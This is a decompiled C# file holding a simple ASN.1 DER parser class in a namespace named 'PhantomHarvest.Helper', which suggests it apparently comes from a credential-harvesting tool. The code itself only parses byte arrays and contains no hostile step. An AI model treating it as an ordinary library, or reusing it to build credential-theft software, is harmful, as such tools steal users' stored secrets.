using System;

namespace PhantomHarvest.Helper
{
	// Token: 0x0200001E RID: 30
	public class Asn1Der
	{
		// Token: 0x0600008C RID: 140 RVA: 0x00007188 File Offset: 0x00005388
		public Asn1DerObject Parse(byte[] dataToParse)
		{
			Asn1DerObject asn1DerObject = new Asn1DerObject();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				Asn1Der.Type type = (Asn1Der.Type)dataToParse[i];
				switch (type)
				{
				case Asn1Der.Type.Integer:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Asn1Der.Type.Integer,
						Lenght = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					Asn1DerObject[] array2 = asn1DerObject.objects.ToArray();
					asn1DerObject.objects[array2.Length - 1].Data = array;
					i = i + 1 + asn1DerObject.objects[array2.Length - 1].Lenght;
					break;
				}
				case Asn1Der.Type.BitString:
				case Asn1Der.Type.Null:
					break;
				case Asn1Der.Type.OctetString:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Asn1Der.Type.OctetString,
						Lenght = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					Asn1DerObject[] array3 = asn1DerObject.objects.ToArray();
					asn1DerObject.objects[array3.Length - 1].Data = array;
					i = i + 1 + asn1DerObject.objects[array3.Length - 1].Lenght;
					break;
				}
				case Asn1Der.Type.ObjectIdentifier:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Asn1Der.Type.ObjectIdentifier,
						Lenght = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					Asn1DerObject[] array4 = asn1DerObject.objects.ToArray();
					asn1DerObject.objects[array4.Length - 1].Data = array;
					i = i + 1 + asn1DerObject.objects[array4.Length - 1].Lenght;
					break;
				}
				default:
					if (type == Asn1Der.Type.Sequence)
					{
						byte[] array;
						if (asn1DerObject.Lenght == 0)
						{
							asn1DerObject.Type = Asn1Der.Type.Sequence;
							asn1DerObject.Lenght = dataToParse.Length - (i + 2);
							array = new byte[asn1DerObject.Lenght];
						}
						else
						{
							asn1DerObject.objects.Add(new Asn1DerObject
							{
								Type = Asn1Der.Type.Sequence,
								Lenght = (int)dataToParse[i + 1]
							});
							array = new byte[(int)dataToParse[i + 1]];
						}
						int length = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
						Array.Copy(dataToParse, i + 2, array, 0, length);
						asn1DerObject.objects.Add(this.Parse(array));
						i = i + 1 + (int)dataToParse[i + 1];
					}
					break;
				}
			}
			return asn1DerObject;
		}

		// Token: 0x0200003C RID: 60
		public enum Type
		{
			// Token: 0x040000C0 RID: 192
			Sequence = 48,
			// Token: 0x040000C1 RID: 193
			Integer = 2,
			// Token: 0x040000C2 RID: 194
			BitString,
			// Token: 0x040000C3 RID: 195
			OctetString,
			// Token: 0x040000C4 RID: 196
			Null,
			// Token: 0x040000C5 RID: 197
			ObjectIdentifier
		}
	}
}
